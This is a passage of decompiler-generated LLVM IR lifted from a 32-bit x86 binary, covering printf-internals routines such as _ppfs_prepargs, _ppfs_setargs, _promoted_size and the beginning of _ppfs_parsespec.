  br i1 %v1_80512e6, label %dec_label_pc_8051304, label %dec_label_pc_80512e8

dec_label_pc_80512e8:                             ; preds = %dec_label_pc_80512e3
  %v1_80512e8 = add i32 %v0_80512e828, 1
  store i32 %v1_80512e8, i32* %eax.global-to-local, align 4
  %v1_80512e9 = inttoptr i32 %v1_80512e8 to i8*
  %v2_80512e9 = load i8, i8* %v1_80512e9, align 1
  %v11_80512e9 = icmp eq i8 %v2_80512e9, 37
  br i1 %v11_80512e9, label %dec_label_pc_8051304, label %dec_label_pc_80512ee

dec_label_pc_80512ee:                             ; preds = %dec_label_pc_80512e8
  %v1_80512f1 = load i32, i32* @ebx, align 4
  %v2_80512f1 = inttoptr i32 %v1_80512f1 to i32*
  store i32 %v1_80512e8, i32* %v2_80512f1, align 4
  %v0_80512f3 = load i32, i32* @ebx, align 4
  %v1_80512f4 = inttoptr i32 %v0_80512f3 to i32*
  %v2_80512f4 = call i32 @_ppfs_parsespec(i32* %v1_80512f4)
  store i32 %v2_80512f4, i32* %eax.global-to-local, align 4
  %v2_80512fc = icmp slt i32 %v2_80512f4, 0
  br i1 %v2_80512fc, label %dec_label_pc_805130f, label %dec_label_pc_8051300

dec_label_pc_8051300:                             ; preds = %dec_label_pc_80512ee
  %v0_8051300 = load i32, i32* @ebx, align 4
  %v1_8051300 = inttoptr i32 %v0_8051300 to i32*
  %v2_8051300 = load i32, i32* %v1_8051300, align 4
  %v4_8051305.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051305.backedge

dec_label_pc_8051304:                             ; preds = %dec_label_pc_80512e8, %dec_label_pc_80512e3
  %v0_8051304 = phi i32 [ %v1_80512e8, %dec_label_pc_80512e8 ], [ %v0_80512e828, %dec_label_pc_80512e3 ]
  %v1_8051304 = add i32 %v0_8051304, 1
  br label %dec_label_pc_8051305.backedge

dec_label_pc_8051305.backedge:                    ; preds = %dec_label_pc_8051304, %dec_label_pc_8051300
  %v4_8051305.be = phi i32 [ %v4_8051305.pre.pre, %dec_label_pc_8051300 ], [ %v6_805130530, %dec_label_pc_8051304 ]
  %v0_80512e8.be = phi i32 [ %v2_8051300, %dec_label_pc_8051300 ], [ %v1_8051304, %dec_label_pc_8051304 ]
  store i32 %v0_80512e8.be, i32* %eax.global-to-local, align 4
  %v1_8051305 = inttoptr i32 %v0_80512e8.be to i8*
  %v2_8051305 = load i8, i8* %v1_8051305, align 1
  %v3_8051305 = zext i8 %v2_8051305 to i32
  %v5_8051305 = and i32 %v4_8051305.be, -256
  %v6_8051305 = or i32 %v3_8051305, %v5_8051305
  store i32 %v6_8051305, i32* %edx.global-to-local, align 4
  %v4_8051307 = icmp eq i8 %v2_8051305, 0
  %v1_8051309 = icmp eq i1 %v4_8051307, false
  br i1 %v1_8051309, label %dec_label_pc_80512e3, label %dec_label_pc_8051305.dec_label_pc_805130b_crit_edge

dec_label_pc_8051305.dec_label_pc_805130b_crit_edge: ; preds = %dec_label_pc_8051305.backedge
  %v0_805130b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805130b

dec_label_pc_805130b:                             ; preds = %dec_label_pc_8051305.dec_label_pc_805130b_crit_edge, %dec_label_pc_80512da
  %v0_805130b = phi i32 [ %v0_805130b.pre, %dec_label_pc_8051305.dec_label_pc_805130b_crit_edge ], [ %v0_80512da, %dec_label_pc_80512da ]
  %v1_805130b = load i32, i32* @ebx, align 4
  %v2_805130b = inttoptr i32 %v1_805130b to i32*
  store i32 %v0_805130b, i32* %v2_805130b, align 4
  br label %dec_label_pc_805130f

dec_label_pc_805130f:                             ; preds = %dec_label_pc_80512ee, %dec_label_pc_805130b
  %storemerge = phi i32 [ 0, %dec_label_pc_805130b ], [ -1, %dec_label_pc_80512ee ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_805130f = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805130f, i32* @edx, align 4
  %v2_8051310 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051310, i32* @ebx, align 4
  store i32 %v0_80512a4, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_8051305, { 1, 0 }
  uselistorder i8 %v2_8051305, { 1, 2, 0 }
  uselistorder i32 %v0_80512e8.be, { 2, 1, 0 }
  uselistorder i32 %v0_80512e828, { 1, 0 }
  uselistorder i32 %v0_80512da, { 1, 0, 2, 3 }
  uselistorder i32 %v1_80512d7, { 0, 2, 1 }
  uselistorder i32 %v1_80512d4, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 6, 5, 7 }
  uselistorder label %dec_label_pc_805130f, { 1, 0 }
  uselistorder label %dec_label_pc_80512e3, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8051314 = load i32, i32* @esi, align 4
  %v0_8051315 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8051321 = add i32 %arg1, 24
  %v2_8051321 = inttoptr i32 %v1_8051321 to i32*
  %v3_8051321 = load i32, i32* %v2_8051321, align 4
  %v2_8051324 = add i32 %arg1, 76
  %v3_8051324 = inttoptr i32 %v2_8051324 to i32*
  store i32 %arg2, i32* %v3_8051324, align 4
  %tmp8 = icmp slt i32 %v3_8051321, 1
  br i1 %tmp8, label %dec_label_pc_8051352, label %dec_label_pc_805132b

dec_label_pc_805132b:                             ; preds = %entry
  %v1_805132e = load i32, i32* @ebx, align 4
  %v2_805132e = add i32 %v1_805132e, 28
  %v3_805132e = inttoptr i32 %v2_805132e to i32*
  store i32 %v3_8051321, i32* %v3_805132e, align 4
  %v0_8051331 = load i32, i32* @ebx, align 4
  %v1_8051331 = add i32 %v0_8051331, 24
  %v2_8051331 = inttoptr i32 %v1_8051331 to i32*
  store i32 0, i32* %v2_8051331, align 4
  %v0_8051338 = load i32, i32* @ebx, align 4
  %v1_8051338 = add i32 %v0_8051338, 4
  %v2_8051338 = inttoptr i32 %v1_8051338 to i32*
  store i32 0, i32* %v2_8051338, align 4
  %v0_805133f = load i32, i32* @ebx, align 4
  %v1_805133f = add i32 %v0_805133f, 8
  %v2_805133f = inttoptr i32 %v1_805133f to i32*
  store i32 0, i32* %v2_805133f, align 4
  %v0_8051346 = load i32, i32* @ebx, align 4
  %v1_8051347 = call i32 @_ppfs_setargs(i32 %v0_8051346)
  %v1_805134f = load i32, i32* @ebx, align 4
  %v2_805134f = add i32 %v1_805134f, 24
  %v3_805134f = inttoptr i32 %v2_805134f to i32*
  store i32 %v3_8051321, i32* %v3_805134f, align 4
  br label %dec_label_pc_8051352

dec_label_pc_8051352:                             ; preds = %entry, %dec_label_pc_805132b
  %v2_8051352 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8051315, i32* @ebx, align 4
  store i32 %v0_8051314, i32* @esi, align 4
  ret i32 %v2_8051352

; uselistorder directives
  uselistorder i32 %v3_8051321, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051352, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051359 = load i32, i32* @ebx, align 4
  store i32 %v0_8051359, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_805135e = add i32 %arg1, 24
  %v2_805135e = inttoptr i32 %v1_805135e to i32*
  %v3_805135e = load i32, i32* %v2_805135e, align 4
  %v4_805135e = icmp eq i32 %v3_805135e, 0
  %v1_8051362 = add i32 %arg1, 80
  store i32 %v1_8051362, i32* %ebx.global-to-local, align 4
  %v1_8051365 = icmp eq i1 %v4_805135e, false
  %v1_805141d = add i32 %arg1, 8
  %v2_805141d = inttoptr i32 %v1_805141d to i32*
  %v3_805141d = load i32, i32* %v2_805141d, align 4
  %v8_805141d = icmp eq i32 %v3_805141d, -2147483648
  %v1_8051424 = icmp eq i1 %v8_805141d, false
  br i1 %v1_8051365, label %dec_label_pc_805141d, label %dec_label_pc_805136b

dec_label_pc_805136b:                             ; preds = %entry
  br i1 %v1_8051424, label %dec_label_pc_8051385, label %dec_label_pc_8051374

dec_label_pc_8051374:                             ; preds = %dec_label_pc_805136b
  %v1_8051374 = add i32 %arg1, 76
  %v2_8051374 = inttoptr i32 %v1_8051374 to i32*
  %v3_8051374 = load i32, i32* %v2_8051374, align 4
  store i32 %v3_8051374, i32* %eax.global-to-local, align 4
  %v1_8051377 = add i32 %v3_8051374, 4
  store i32 %v1_8051377, i32* %edx.global-to-local, align 4
  store i32 %v1_8051377, i32* %v2_8051374, align 4
  %v0_805137d = load i32, i32* %eax.global-to-local, align 4
  %v1_805137d = inttoptr i32 %v0_805137d to i32*
  %v2_805137d = load i32, i32* %v1_805137d, align 4
  store i32 %v2_805137d, i32* %eax.global-to-local, align 4
  %v1_805137f = load i32, i32* @ecx, align 4
  %v2_805137f = add i32 %v1_805137f, 80
  %v3_805137f = inttoptr i32 %v2_805137f to i32*
  store i32 %v2_805137d, i32* %v3_805137f, align 4
  %v0_8051382 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051382 = load i32, i32* @ecx, align 4
  %v2_8051382 = add i32 %v1_8051382, 8
  %v3_8051382 = inttoptr i32 %v2_8051382 to i32*
  store i32 %v0_8051382, i32* %v3_8051382, align 4
  %v0_8051385.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051385

dec_label_pc_8051385:                             ; preds = %dec_label_pc_805136b, %dec_label_pc_8051374
  %v1_8051394 = phi i32 [ %arg1, %dec_label_pc_805136b ], [ %v0_8051385.pre, %dec_label_pc_8051374 ]
  %v1_8051385 = add i32 %v1_8051394, 4
  %v2_8051385 = inttoptr i32 %v1_8051385 to i32*
  %v3_8051385 = load i32, i32* %v2_8051385, align 4
  %v8_8051385 = icmp eq i32 %v3_8051385, -2147483648
  %v1_805138c = icmp eq i1 %v8_8051385, false
  br i1 %v1_805138c, label %dec_label_pc_805139f, label %dec_label_pc_805138e

dec_label_pc_805138e:                             ; preds = %dec_label_pc_8051385
  %v1_805138e = add i32 %v1_8051394, 76
  %v2_805138e = inttoptr i32 %v1_805138e to i32*
  %v3_805138e = load i32, i32* %v2_805138e, align 4
  store i32 %v3_805138e, i32* %eax.global-to-local, align 4
  %v1_8051391 = add i32 %v3_805138e, 4
  store i32 %v1_8051391, i32* %edx.global-to-local, align 4
  store i32 %v1_8051391, i32* %v2_805138e, align 4
  %v0_8051397 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051397 = inttoptr i32 %v0_8051397 to i32*
  %v2_8051397 = load i32, i32* %v1_8051397, align 4
  store i32 %v2_8051397, i32* %eax.global-to-local, align 4
  %v1_8051399 = load i32, i32* @ecx, align 4
  %v2_8051399 = add i32 %v1_8051399, 80
  %v3_8051399 = inttoptr i32 %v2_8051399 to i32*
  store i32 %v2_8051397, i32* %v3_8051399, align 4
  %v0_805139c = load i32, i32* %eax.global-to-local, align 4
  %v1_805139c = load i32, i32* @ecx, align 4
  %v2_805139c = add i32 %v1_805139c, 4
  %v3_805139c = inttoptr i32 %v2_805139c to i32*
  store i32 %v0_805139c, i32* %v3_805139c, align 4
  %v1_805141615.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805139f

dec_label_pc_805139f:                             ; preds = %dec_label_pc_8051385, %dec_label_pc_805138e
  %v1_805141615 = phi i32 [ %v1_8051394, %dec_label_pc_8051385 ], [ %v1_805141615.pre, %dec_label_pc_805138e ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_805141616 = add i32 %v1_805141615, 28
  %v3_805141617 = inttoptr i32 %v2_805141616 to i32*
  %v4_805141618 = load i32, i32* %v3_805141617, align 4
  %v5_805141920 = icmp sgt i32 %v4_805141618, 0
  br i1 %v5_805141920, label %dec_label_pc_80513a3, label %dec_label_pc_805144b.loopexit

dec_label_pc_80513a3:                             ; preds = %dec_label_pc_805139f, %dec_label_pc_8051415
  %v1_805141622 = phi i32 [ %v1_8051416, %dec_label_pc_8051415 ], [ %v1_805141615, %dec_label_pc_805139f ]
  %v1_80513a321 = phi i32 [ %v1_8051415, %dec_label_pc_8051415 ], [ 0, %dec_label_pc_805139f ]
  %v2_80513a3 = mul i32 %v1_80513a321, 4
  %v3_80513a3 = add i32 %v2_80513a3, 40
  %v4_80513a3 = add i32 %v3_80513a3, %v1_805141622
  %v5_80513a3 = inttoptr i32 %v4_80513a3 to i32*
  %v6_80513a3 = load i32, i32* %v5_80513a3, align 4
  store i32 %v6_80513a3, i32* %eax.global-to-local, align 4
  %v1_80513a7 = add i32 %v6_80513a3, -8
  %v9_80513a7 = icmp eq i32 %v1_80513a7, 0
  br i1 %v9_80513a7, label %dec_label_pc_8051415, label %dec_label_pc_80513ac

dec_label_pc_80513ac:                             ; preds = %dec_label_pc_80513a3
  %v10_80513a7 = icmp slt i32 %v1_80513a7, 0
  %v6_80513a7 = sub i32 7, %v6_80513a3
  %v7_80513a7 = and i32 %v6_80513a7, %v6_80513a3
  %v8_80513a7 = icmp slt i32 %v7_80513a7, 0
  %v1_80513ac = add i32 %v1_805141622, 76
  %v2_80513ac = inttoptr i32 %v1_80513ac to i32*
  %v3_80513ac = load i32, i32* %v2_80513ac, align 4
  store i32 %v3_80513ac, i32* %edx.global-to-local, align 4
  %v3_80513af = icmp eq i1 %v10_80513a7, %v8_80513a7
  br i1 %v3_80513af, label %dec_label_pc_80513bf, label %dec_label_pc_80513b1

dec_label_pc_80513b1:                             ; preds = %dec_label_pc_80513ac
  %tmp13 = icmp slt i32 %v6_80513a3, 3
  %v9_80513b8 = icmp eq i32 %v6_80513a3, 7
  %v1_80513bb = icmp eq i1 %v9_80513b8, false
  %or.cond = or i1 %tmp13, %v1_80513bb
  br i1 %or.cond, label %dec_label_pc_8051408, label %dec_label_pc_80513ea

dec_label_pc_80513bf:                             ; preds = %dec_label_pc_80513ac
  %tmp14 = icmp sgt i32 %v6_80513a3, 1024
  br i1 %tmp14, label %dec_label_pc_80513c8, label %dec_label_pc_8051408

dec_label_pc_80513c8:                             ; preds = %dec_label_pc_80513bf
  %v6_80513c8 = icmp eq i32 %v6_80513a3, 2048
  br i1 %v6_80513c8, label %dec_label_pc_80513d8, label %dec_label_pc_80513cf

dec_label_pc_80513cf:                             ; preds = %dec_label_pc_80513c8
  %v9_80513cf = icmp eq i32 %v6_80513a3, 2055
  %v1_80513d4 = icmp eq i1 %v9_80513cf, false
  br i1 %v1_80513d4, label %dec_label_pc_8051408, label %dec_label_pc_80513f9

dec_label_pc_80513d8:                             ; preds = %dec_label_pc_80513c8
  %v1_80513d8 = add i32 %v3_80513ac, 8
  store i32 %v1_80513d8, i32* %eax.global-to-local, align 4
  store i32 %v1_80513d8, i32* %v2_80513ac, align 4
  %v0_80513de = load i32, i32* %edx.global-to-local, align 4
  %v1_80513de = inttoptr i32 %v0_80513de to i32*
  %v2_80513de = load i32, i32* %v1_80513de, align 4
  store i32 %v2_80513de, i32* %eax.global-to-local, align 4
  %v1_80513e0 = add i32 %v0_80513de, 4
  %v2_80513e0 = inttoptr i32 %v1_80513e0 to i32*
  %v3_80513e0 = load i32, i32* %v2_80513e0, align 4
  store i32 %v3_80513e0, i32* %edx.global-to-local, align 4
  %v1_80513e3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80513e3 = inttoptr i32 %v1_80513e3 to i32*
  store i32 %v2_80513de, i32* %v2_80513e3, align 4
  %v0_80513e5 = load i32, i32* %edx.global-to-local, align 4
  %v1_80513e5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80513e5 = add i32 %v1_80513e5, 4
  %v3_80513e5 = inttoptr i32 %v2_80513e5 to i32*
  store i32 %v0_80513e5, i32* %v3_80513e5, align 4
  br label %dec_label_pc_8051412

dec_label_pc_80513ea:                             ; preds = %dec_label_pc_80513b1
  %v3_80513ea = load i32, i32* %v2_80513ac, align 4
  store i32 %v3_80513ea, i32* %edx.global-to-local, align 4
  %v1_80513ed = add i32 %v3_80513ea, 8
  store i32 %v1_80513ed, i32* %eax.global-to-local, align 4
  store i32 %v1_80513ed, i32* %v2_80513ac, align 4
  %v0_80513f3 = load i32, i32* %edx.global-to-local, align 4
  %v1_80513f3 = inttoptr i32 %v0_80513f3 to double*
  %v2_80513f3 = load double, double* %v1_80513f3, align 4
  %v2_80513f5 = load i32, i32* %ebx.global-to-local, align 4
  %v4_80513f5 = inttoptr i32 %v2_80513f5 to double*
  store double %v2_80513f3, double* %v4_80513f5, align 4
  br label %dec_label_pc_8051412

dec_label_pc_80513f9:                             ; preds = %dec_label_pc_80513cf
  %v3_80513f9 = load i32, i32* %v2_80513ac, align 4
  store i32 %v3_80513f9, i32* %edx.global-to-local, align 4
  %v1_80513fc = add i32 %v3_80513f9, 12
  store i32 %v1_80513fc, i32* %eax.global-to-local, align 4
  store i32 %v1_80513fc, i32* %v2_80513ac, align 4
  %v0_8051402 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051402 = inttoptr i32 %v0_8051402 to x86_fp80*
  %v2_8051402 = load x86_fp80, x86_fp80* %v1_8051402, align 4
  %v2_8051404 = load i32, i32* %ebx.global-to-local, align 4
  %v3_8051404 = inttoptr i32 %v2_8051404 to x86_fp80*
  store x86_fp80 %v2_8051402, x86_fp80* %v3_8051404, align 4
  br label %dec_label_pc_8051412

dec_label_pc_8051408:                             ; preds = %dec_label_pc_80513b1, %dec_label_pc_80513bf, %dec_label_pc_80513cf
  %v1_8051408 = add i32 %v3_80513ac, 4
  store i32 %v1_8051408, i32* %eax.global-to-local, align 4
  store i32 %v1_8051408, i32* %v2_80513ac, align 4
  %v0_805140e = load i32, i32* %edx.global-to-local, align 4
  %v1_805140e = inttoptr i32 %v0_805140e to i32*
  %v2_805140e = load i32, i32* %v1_805140e, align 4
  store i32 %v2_805140e, i32* %eax.global-to-local, align 4
  %v1_8051410 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051410 = inttoptr i32 %v1_8051410 to i32*
  store i32 %v2_805140e, i32* %v2_8051410, align 4
  br label %dec_label_pc_8051412

dec_label_pc_8051412:                             ; preds = %dec_label_pc_80513f9, %dec_label_pc_80513ea, %dec_label_pc_80513d8, %dec_label_pc_8051408
  %v0_8051412 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051412 = add i32 %v0_8051412, 12
  store i32 %v1_8051412, i32* %ebx.global-to-local, align 4
  %v0_8051415.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8051416.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051415

dec_label_pc_8051415:                             ; preds = %dec_label_pc_80513a3, %dec_label_pc_8051412
  %v1_8051416 = phi i32 [ %v1_805141622, %dec_label_pc_80513a3 ], [ %v1_8051416.pre, %dec_label_pc_8051412 ]
  %v0_8051415 = phi i32 [ %v1_80513a321, %dec_label_pc_80513a3 ], [ %v0_8051415.pre, %dec_label_pc_8051412 ]
  %v1_8051415 = add i32 %v0_8051415, 1
  store i32 %v1_8051415, i32* %esi.global-to-local, align 4
  %v2_8051416 = add i32 %v1_8051416, 28
  %v3_8051416 = inttoptr i32 %v2_8051416 to i32*
  %v4_8051416 = load i32, i32* %v3_8051416, align 4
  %v5_8051419 = icmp slt i32 %v1_8051415, %v4_8051416
  br i1 %v5_8051419, label %dec_label_pc_80513a3, label %dec_label_pc_8051416.dec_label_pc_805144b.loopexit_crit_edge

dec_label_pc_805141d:                             ; preds = %entry
  br i1 %v1_8051424, label %dec_label_pc_8051434, label %dec_label_pc_8051426

dec_label_pc_8051426:                             ; preds = %dec_label_pc_805141d
  %v1_8051426 = add i32 %arg1, 36
  %v2_8051426 = inttoptr i32 %v1_8051426 to i8*
  %v3_8051426 = load i8, i8* %v2_8051426, align 1
  %v2_805142a = zext i8 %v3_8051426 to i32
  %v3_805142a = mul nuw nsw i32 %v2_805142a, 12
  store i32 %v3_805142a, i32* %eax.global-to-local, align 4
  %v2_805142d = add i32 %arg1, 68
  %v3_805142d = add i32 %v2_805142d, %v3_805142a
  %v4_805142d = inttoptr i32 %v3_805142d to i32*
  %v5_805142d = load i32, i32* %v4_805142d, align 4
  store i32 %v5_805142d, i32* %eax.global-to-local, align 4
  store i32 %v5_805142d, i32* %v2_805141d, align 4
  %v0_8051434.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051434

dec_label_pc_8051434:                             ; preds = %dec_label_pc_805141d, %dec_label_pc_8051426
  %v1_8051448 = phi i32 [ %arg1, %dec_label_pc_805141d ], [ %v0_8051434.pre, %dec_label_pc_8051426 ]
  %v1_8051434 = add i32 %v1_8051448, 4
  %v2_8051434 = inttoptr i32 %v1_8051434 to i32*
  %v3_8051434 = load i32, i32* %v2_8051434, align 4
  %v8_8051434 = icmp eq i32 %v3_8051434, -2147483648
  %v1_805143b = icmp eq i1 %v8_8051434, false
  br i1 %v1_805143b, label %dec_label_pc_805144b, label %dec_label_pc_805143d

dec_label_pc_805143d:                             ; preds = %dec_label_pc_8051434
  %v1_805143d = add i32 %v1_8051448, 37
  %v2_805143d = inttoptr i32 %v1_805143d to i8*
  %v3_805143d = load i8, i8* %v2_805143d, align 1
  %v2_8051441 = zext i8 %v3_805143d to i32
  %v3_8051441 = mul nuw nsw i32 %v2_8051441, 12
  store i32 %v3_8051441, i32* %eax.global-to-local, align 4
  %v1_8051444 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051444 = add nsw i32 %v3_8051441, -12
  %v3_8051444 = add i32 %v2_8051444, %v1_8051444
  %v4_8051444 = inttoptr i32 %v3_8051444 to i32*
  %v5_8051444 = load i32, i32* %v4_8051444, align 4
  store i32 %v5_8051444, i32* %eax.global-to-local, align 4
  store i32 %v5_8051444, i32* %v2_8051434, align 4
  %v0_805144b.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805144b

dec_label_pc_8051416.dec_label_pc_805144b.loopexit_crit_edge: ; preds = %dec_label_pc_8051415
  br label %dec_label_pc_805144b.loopexit

dec_label_pc_805144b.loopexit:                    ; preds = %dec_label_pc_8051416.dec_label_pc_805144b.loopexit_crit_edge, %dec_label_pc_805139f
  %v1_8051416.lcssa = phi i32 [ %v1_8051416, %dec_label_pc_8051416.dec_label_pc_805144b.loopexit_crit_edge ], [ %v1_805141615, %dec_label_pc_805139f ]
  br label %dec_label_pc_805144b

dec_label_pc_805144b:                             ; preds = %dec_label_pc_805144b.loopexit, %dec_label_pc_8051434, %dec_label_pc_805143d
  %v10_8051452 = phi i32 [ %v1_8051416.lcssa, %dec_label_pc_805144b.loopexit ], [ %v1_8051448, %dec_label_pc_8051434 ], [ %v0_805144b.pre, %dec_label_pc_805143d ]
  %v1_805144b = add i32 %v10_8051452, 8
  %v2_805144b = inttoptr i32 %v1_805144b to i32*
  %v3_805144b = load i32, i32* %v2_805144b, align 4
  store i32 %v3_805144b, i32* %eax.global-to-local, align 4
  %v2_805144e = icmp slt i32 %v3_805144b, 0
  %v1_8051450 = icmp eq i1 %v2_805144e, false
  br i1 %v1_8051450, label %dec_label_pc_8051466, label %dec_label_pc_8051452

dec_label_pc_8051452:                             ; preds = %dec_label_pc_805144b
  %v1_8051452 = add i32 %v10_8051452, 16
  %v2_8051452 = inttoptr i32 %v1_8051452 to i32*
  %v3_8051452 = load i32, i32* %v2_8051452, align 4
  %v4_8051452 = or i32 %v3_8051452, 8
  store i32 %v4_8051452, i32* %v2_8051452, align 4
  %v0_8051456 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051456 = sub i32 0, %v0_8051456
  store i32 %v1_8051456, i32* %eax.global-to-local, align 4
  %v1_8051458 = load i32, i32* @ecx, align 4
  %v2_8051458 = add i32 %v1_8051458, 8
  %v3_8051458 = inttoptr i32 %v2_8051458 to i32*
  store i32 %v1_8051456, i32* %v3_8051458, align 4
  %v0_805145b = load i32, i32* @ecx, align 4
  %v1_805145b = add i32 %v0_805145b, 16
  %v2_805145b = inttoptr i32 %v1_805145b to i32*
  %v3_805145b = load i32, i32* %v2_805145b, align 4
  %v4_805145b = and i32 %v3_805145b, -2
  store i32 %v4_805145b, i32* %v2_805145b, align 4
  %v0_805145f = load i32, i32* @ecx, align 4
  %v1_805145f = add i32 %v0_805145f, 20
  %v2_805145f = inttoptr i32 %v1_805145f to i32*
  store i32 32, i32* %v2_805145f, align 4
  %v0_8051468.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051466

dec_label_pc_8051466:                             ; preds = %dec_label_pc_805144b, %dec_label_pc_8051452
  %v0_8051468 = phi i32 [ %v3_805144b, %dec_label_pc_805144b ], [ %v0_8051468.pre, %dec_label_pc_8051452 ]
  %v2_8051466 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051466, i32* @ebx, align 4
  ret i32 %v0_8051468

; uselistorder directives
  uselistorder i32 %v3_8051441, { 1, 0 }
  uselistorder i32 %v3_805142a, { 1, 0 }
  uselistorder i32 %v1_8051415, { 2, 1, 0 }
  uselistorder i32 %v1_8051416, { 1, 2, 0 }
  uselistorder i32 %v3_80513ac, { 1, 0, 2 }
  uselistorder i32* %v2_80513ac, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_80513a7, { 1, 0 }
  uselistorder i32 %v6_80513a3, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_80513a321, { 1, 0 }
  uselistorder i32 %v1_805141615, { 2, 0, 1 }
  uselistorder i1 %v1_8051424, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_8051466, { 1, 0 }
  uselistorder label %dec_label_pc_805144b, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8051434, { 1, 0 }
  uselistorder label %dec_label_pc_8051415, { 1, 0 }
  uselistorder label %dec_label_pc_8051412, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8051408, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80513a3, { 1, 0 }
  uselistorder label %dec_label_pc_805139f, { 1, 0 }
  uselistorder label %dec_label_pc_8051385, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805146c = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051473

dec_label_pc_8051473:                             ; preds = %dec_label_pc_8051473, %entry
  %v0_8051473 = phi i32 [ ptrtoint (i8** @global_var_806052a.711 to i32), %entry ], [ %v1_8051473, %dec_label_pc_8051473 ]
  %v1_8051473 = add i32 %v0_8051473, -2
  %v1_8051476 = inttoptr i32 %v1_8051473 to i16*
  %v2_8051476 = load i16, i16* %v1_8051476, align 2
  %v3_8051476 = sext i16 %v2_8051476 to i32
  %v12_8051479 = icmp ne i32 %v3_8051476, %v0_805146c
  %v6_8051483 = icmp ugt i32 %v1_8051473, ptrtoint (i32* @global_var_8060512.712 to i32)
  %or.cond = and i1 %v6_8051483, %v12_8051479
  br i1 %or.cond, label %dec_label_pc_8051473, label %dec_label_pc_8051485

dec_label_pc_8051485:                             ; preds = %dec_label_pc_8051473
  %.pre = add i32 %v0_8051473, -134612244
  %v2_805148b = sdiv i32 %.pre, 2
  store i32 %v2_805148b, i32* @edx, align 4
  %v1_805148d = add i32 %v2_805148b, ptrtoint (i8** @global_var_806052a.711 to i32)
  %v2_805148d = inttoptr i32 %v1_805148d to i8*
  %v3_805148d = load i8, i8* %v2_805148d, align 1
  %v4_805148d = zext i8 %v3_805148d to i32
  ret i32 %v4_805148d

; uselistorder directives
  uselistorder i32 %v2_805148b, { 1, 0 }
  uselistorder i32 %v1_8051473, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_806052a.711 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051496 = load i32, i32* @edi, align 4
  %v0_8051497 = load i32, i32* @esi, align 4
  %v0_8051498 = load i32, i32* @ebx, align 4
  store i32 %v0_8051498, i32* %stack_var_-16, align 4
  %v4_8051498 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_80514c4 = add i32 %tmp76, 24
  %v2_80514c4 = inttoptr i32 %v1_80514c4 to i32*
  %v3_80514c4 = load i32, i32* %v2_80514c4, align 4
  store i32 %v3_80514c4, i32* %eax.global-to-local, align 4
  %v1_80514cb = add i32 %tmp76, 16
  %v2_80514cb = inttoptr i32 %v1_80514cb to i32*
  %v3_80514cb = load i32, i32* %v2_80514cb, align 4
